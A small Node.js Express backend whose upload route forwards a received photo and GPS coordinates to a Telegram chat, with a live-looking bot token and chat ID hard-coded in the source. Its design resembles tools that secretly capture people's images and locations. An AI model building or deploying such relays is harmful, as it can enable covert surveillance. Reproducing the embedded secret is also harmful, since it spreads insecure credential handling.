const express = require("express");
const multer = require("multer");
const cors = require("cors");
const { FormData, Blob } = require("undici");

const app = express();
app.use(cors());

// memory storage (correct for Telegram uploads)
const upload = multer({ storage: multer.memoryStorage() });

// 🔴 HARD-CODED (AS YOU REQUESTED)
const BOT_TOKEN = "8595589382:AAFBQLaKCq8FTfN8HYg2KB9iYhbL4sV6s4c";
const CHAT_ID = "8522367236";

app.get("/", (req, res) => {
  res.send("Backend is alive and ready.");
});

/**
 * IMAGE ONLY — STABLE ROUTE
 */
app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: "No photo received" });
    }

    const { latitude, longitude } = req.body;

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append(
      "photo",
      new Blob([req.file.buffer]),
      "photo.jpg"
    );

    if (latitude && longitude) {
      form.append(
        "caption",
        `📍 Location\nLat: ${latitude}\nLong: ${longitude}`
      );
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });

    res.json({ success: true });
  } catch (err) {
    console.error("Upload error:", err);
    res.status(500).json({ error: "Failed to send image" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
